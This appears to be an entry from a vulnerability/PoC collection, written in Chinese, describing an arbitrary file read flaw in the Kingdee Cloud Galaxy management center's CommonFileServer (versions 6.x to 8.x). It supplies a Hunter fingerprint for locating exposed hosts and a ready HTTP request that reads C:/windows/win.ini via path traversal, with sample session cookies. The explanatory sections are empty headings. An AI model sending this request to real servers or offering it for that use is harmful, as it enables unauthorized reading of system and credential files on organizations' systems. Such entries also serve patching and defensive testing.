# 金蝶云星空管理中心CommonFileserver任意文件读取漏洞

- **系统**：金蝶　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`hunter：`app.name="Kingdee 金蝶云星空"``
- **请求**：`GET /CommonFileServer/c:/windows/win.ini HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Cookie: ASP.NET_SessionId=hl04qxxhwmpaopayogxny0c3; Theme=standard; kdservice-sessionid=…`

**请求体 / payload**
```

```

**其他**
- 金蝶云星空管理中心CommonFileserver 任意文件读取漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 金蝶云星空-管理中心 6.x版本 && 7.x版本 && 8.x版本